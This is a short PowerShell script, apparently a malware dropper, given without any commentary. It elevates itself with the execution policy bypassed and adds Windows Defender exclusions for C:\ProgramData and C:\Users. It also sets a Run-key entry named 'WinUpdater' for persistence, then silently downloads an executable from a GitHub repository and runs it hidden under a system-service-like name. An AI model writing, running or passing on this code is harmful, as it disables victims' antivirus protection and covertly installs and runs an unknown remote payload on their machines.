if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"") -Verb RunAs
    exit
}

Add-MpPreference -ExclusionPath "C:\ProgramData" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Users" -ErrorAction SilentlyContinue

$p = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$p`"" -ErrorAction SilentlyContinue

$u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
$o = "$env:APPDATA\win_sys_service.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    (New-Object System.Net.WebClient).DownloadFile($u, $o)
    Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
} catch {}
